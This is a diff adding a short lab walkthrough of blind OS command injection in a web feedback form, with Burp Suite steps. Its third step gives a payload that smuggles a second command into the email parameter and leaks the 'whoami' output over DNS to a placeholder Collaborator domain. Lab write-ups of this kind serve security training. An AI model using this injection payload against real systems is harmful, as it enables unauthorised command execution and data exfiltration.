@@ -1,0 +1,53 @@
+Description:
+The application contains a blind OS command injection vulnerability in the feedback function.
+Commands are executed asynchronously with no visible output, and direct output retrieval is not possible.
+
+However, it is possible to exfiltrate data using DNS-based out-of-band (OOB) techniques.
+
+Objective:
+-Execute:
+whoami
+-Exfiltrate the output via DNS
+-Identify the current system user
+
+Tools Used:
+-Burp Suite Professional (Proxy, Collaborator)
+
+Exploitation Steps:
+1️-Intercept Request
+-Go to the Feedback form
+-Submit any data
+-Intercept the request using Burp Suite
+
+2️-Get Collaborator Payload
+-Go to Burp Collaborator tab
+-Click Copy to clipboard
+-Save the generated domain
+
+3️-Inject Payload
+-Modify the email parameter:
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+-Replace:
+BURP-COLLABORATOR-SUBDOMAIN
+with your generated domain
+
+4️-Send Request
+-Forward the request
+
+5️-Poll for Interaction
+-Go to Collaborator tab
+-Click Poll now
+
+Wait a few seconds (asynchronous execution)
+
+6️-Analyze Result
+-Check DNS interactions
+-Observe the subdomain:
+<username>.your-collaborator-domain
+
+The whoami output is embedded in the DNS request
+
+Result:
+-Successfully executed blind OS command injection
+-Exfiltrated command output via DNS
+-Retrieved current system user
